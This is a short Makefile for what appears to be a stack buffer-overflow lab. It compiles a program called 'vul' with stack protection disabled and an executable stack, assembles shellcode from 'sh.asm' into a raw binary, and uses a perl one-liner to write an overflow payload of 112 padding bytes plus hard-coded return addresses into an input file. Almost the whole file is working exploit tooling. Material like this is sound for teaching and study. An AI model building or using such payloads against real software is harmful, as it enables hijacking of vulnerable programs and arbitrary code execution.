
all: vul sh

vul: vul.c
	gcc -o vul vul.c -m32 -fno-stack-protector -zexecstack -g

sh: sh.asm
	nasm -felf32 sh.asm -o sh.o
	ld sh.o -o sh -melf_i386
	objcopy -O binary sh.o sh.bin
	perl -e 'print "A"x112,"\x10\x83\x04\x08","\x10\xaf\x04\x08","\x10\xaf\x04\x08","\n"' > input

